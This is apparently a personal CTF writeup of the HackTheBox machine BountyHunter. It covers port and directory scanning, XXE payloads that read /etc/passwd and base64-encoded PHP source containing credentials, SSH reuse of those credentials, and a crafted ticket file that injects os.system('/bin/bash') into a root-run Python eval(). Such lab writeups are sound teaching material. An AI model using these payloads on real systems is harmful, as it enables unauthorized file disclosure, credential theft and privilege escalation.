# HackTheBox — BountyHunter Writeup
_BountyHunter is the first active machine I owned. It just got retired which means I can finally publish my first ever writeup. I will do my best to describe my whole thought process for solving this challenge and hopefully you will learn something new._

## Machine info
- OS - **Linux** 🐧
- Release Date - **24 Jul 2021**
- Difficulty - **Easy**
- Points - **20**

## User

Let's start with a standard nmap scan.
```
nmap -sV -sC -oA bountyhounter 10.10.11.100
```

> Note: If you have trouble understanding this or any other unix command, I recommend you to check out [explainshell.com](https://explainshell.com/explain?cmd=nmap+-sV+-sC+-oA+bountyhounter+10.10.11.100 "explainshell.com"). **Nmap** has plenty of options for scanning, but for HackTheBox machines this command is usually my very first step.

After running nmap scan, we get this output.
```
Nmap scan report for 10.10.11.100 (10.10.11.100)
Host is up (0.039s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two open ports, ssh at port 22 and http at port 80. Let's open up our web browser and check what's going on at port 80.

![](https://i.imgur.com/GJEOvDP.png)

At the first glance there may be some clues, for example "Can use Burp" which may indicate that we will need BurpSuite for this challenge. Also keep in mind that "Copyright © **John** 2020" in the footer. *John* might be a clue for a username or something else later on.

> Note: **BurpSuite** is a common tool used for penetration testing of web applications. We will use BurpSuite a lot when dealing with web apps and I highly recommend you to get familiar with it. Personally, I use BurpSuite with FoxyProxy extension in Firefox.

All the links on the page are just links to the different parts of the same page, except one navigation link that leads us to **/portal.php**. Let's click on that link.

![](https://i.imgur.com/LZ9w2zH.png)

It just shows us this message with a link. We will follow the link but before proceeding, let's run **dirb** and hopefully find more pages. Since we know the website is written in php, we can specify *.php* extension with -X flag.

> Note: **Dirb** is a common tool used for scanning for hidden web content using wordlists. I recommend getting familiar with dirb and its alternative **gobuster**. Personally, I mostly use dirb for HTB.

```sh
dirb http://10.10.11.100/ -X .php
```

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Nov 19 04:13:28 2021
URL_BASE: http://10.10.11.100/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.11.100/ ----
```

We will leave dirb to run in the background while we are exploring by hand. Let's now find out where that link leads us to.

![](https://i.imgur.com/kgAK49T.png)

This page has a form. Since it's just a simple form and seemingly nothing else, let's take a deeper look before submitting anything or running Burp. We will start by inspecting the page source.

```html
<html>
<head>
<script src="/resources/jquery.min.js"></script>
<script src="/resources/bountylog.js"></script>
</head>
<center>
<h1>Bounty Report System - Beta</h1>
<input type="text" id = "exploitTitle" name="exploitTitle" placeholder="Exploit Title">
<br>
<input type="text" id = "cwe" name="cwe" placeholder="CWE">
<br>
<input type="text" id = "cvss" name="exploitCVSS" placeholder="CVSS Score">
<br>
<input type="text" id = "reward" name="bountyReward" placeholder="Bounty Reward ($)">
<br>
<input type="submit" onclick = "bountySubmit()" value="Submit" name="submit">
<br>
<p id = "return"></p>
<center>
</html>
	
```
`bountySubmit()` function is called when submitting the form. Let's take a look at **/resources/bountylog.js** (linked in the head section) and hopefully find out what that function does.

```js
function returnSecret(data) {
    return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}

async function bountySubmit() {
    try {
        var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
        <bugreport>
        <title>${$('#exploitTitle').val()}</title>
        <cwe>${$('#cwe').val()}</cwe>
        <cvss>${$('#cvss').val()}</cvss>
        <reward>${$('#reward').val()}</reward>
        </bugreport>`
        let data = await returnSecret(btoa(xml));
        $("#return").html(data)
    }
    catch(error) {
        console.log('Error:', error);
    }
}
```

Okay, there is some interesting stuff going on. Function `returnSecret(data)` returns data from **tracker_diRbPr00f314.php**.  Even that filename is telling us to use dirb! (it says "dirb proof 314")

Visiting that php file prints only this text. I figured out it's used for displaying our submission data under the form.

![](https://i.imgur.com/w4UWiwg.png)

![](https://i.imgur.com/OGol9eT.png)

Right now it seems like that's not the interesting part, except that filename. The actual intriguing part for me is submitting XML data in `bountySubmit()` function. I recommend you to get familiar with **XML external entity injection (XXE)** after reading this writeup. Here is a great article by PortSwigger about that type of an attack: https://portswigger.net/web-security/xxe

Let's open up BurpSuite, submit the form and intercept the request.

![](https://i.imgur.com/PYuaGER.png)

Submitted data is base64 encoded xml. Decoding will give us this.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<bugreport>
    <title>Test1</title>
    <cwe>Test2</cwe>
    <cvss>10</cvss>
    <reward>1337</reward>
</bugreport>
```

Now we will attempt to trigger the xxe attack. For example, let's try to get **/etc/passwd**.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
    <!ENTITY hack SYSTEM "file:///etc/passwd">
]>
<bugreport>
    <title>&hack;</title>
    <cwe>Test2</cwe>
    <cvss>10</cvss>
    <reward>1337</reward>
</bugreport>
```

This should do the trick. Contents of /etc/passwd should be stored inside `hack` entity which is put inside `<title>` tag. Let's forward that request.

![](https://i.imgur.com/Nwwu2sL.png)

Here we go, we managed to get /etc/passwd! 

First column in /etc/passwd represents the **username**, and the last one represents the absolute path to **user's shell**. Most of users listed in /etc/passwd file can't actually login, and their shell is set to `/usr/sbin/nologin`. To enumerate actual users who can login, we can search for those users who have their shell set to `/bin/bash`.

```
$ cat passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
development:x:1000:1000:Development:/home/development:/bin/bash
```

Besides the root user, there is one user and he goes by the username **development**. Let's just keep that in mind for now.

Since we are able to fetch arbitrary files through xxe, we can take a look into some of the source code!

Remember dirb?

Well, it DID find something!

```
(...)
---- Scanning URL: http://10.10.11.100/ ----
+ http://10.10.11.100/db.php (CODE:200|SIZE:0)
+ http://10.10.11.100/index.php (CODE:200|SIZE:25169)
+ http://10.10.11.100/portal.php (CODE:200|SIZE:125)
```

That db.php seems **very** interesting. We will try to read it.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
    <!ENTITY hack SYSTEM "php://filter/convert.base64-encode/resource=db.php">
]>
<bugreport>
    <title>&hack;</title>
    <cwe>Test2</cwe>
    <cvss>10</cvss>
    <reward>1337</reward>
</bugreport>
```

This payload using `php://filter` should do the trick. I didn't think of that payload myself, I found it on this [list of xxe payloads](https://github.com/payloadbox/xxe-injection-payload-list#xxe-access-control-bypass-loading-restricted-resources---php-example "this list") and you should check out the whole thing too.

![](https://i.imgur.com/OZtCVBN.png)

![](https://i.imgur.com/j6gzPjs.png)

After fetching the base64 encoded php file and sending it to decoder, we discovered some credentials to a database that is yet to be implemented. Let's try to use that password to login as *development* user through ssh.

![](https://i.imgur.com/C91Wq0Z.png)

That did work, user owned. 🎉

## Root

```
development@bountyhunter:~$ ls
contract.txt  user.txt
```

Besides the user flag there is also contract.txt in the home directory. Let's find out what it says.

```
development@bountyhunter:~$ cat contract.txt 
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```

Hey, it's John. Yes, *that* John. He has set up some permissions for us, let's run `sudo -l` to see what we can run as root.

```
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

We can run **/opt/skytrain_inc/ticketValidator.py** as root. Let's examine that code and see what we can do.

```py
def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

Now this is just a puzzle where the goal is to get to the `eval` function and execute arbitrary Python code. We will try to run `__import__('os').system('/bin/bash')` and get the root shell.

The script reads a file and a part of the file is being run inside the eval function. Let's look at the code again and create the file step by step.

FIlename must end with` .md`
```py
def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()
```

First line of the file must start with `# Skytrain lnc`
```py
def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
```

Second line of the file must start with `## Ticket to`
```py
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
```

Third line of the file must start with `__Ticket Code:__`
```py
        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue
```

Fourth line must start with `**`
```py
        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
```

Fourth line is followed by a number that gives remainder of 4 when divided by 7 (number `11`) and `+` sign.
```py
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False
```

Everything in fourth line after `**` gets into eval function. In our case, it will be `11+__import__('os').system('/bin/bash')`

I ended up with this:
```
# Skytrain Inc
## Ticket to 
__Ticket Code:___
**11+__import__('os').system('/bin/bash')
```

Let's run the script and try it out.

![](https://i.imgur.com/OnpN6xp.png)

Rooted! 🔥

## Conclusion

BountyHunter is the first active machine I owned, and this is my very first writeup. I really enjoyed this box because it's beginner friendly, I was already familiar with xxe attack and it made me feel like a true 1337. 👨‍💻
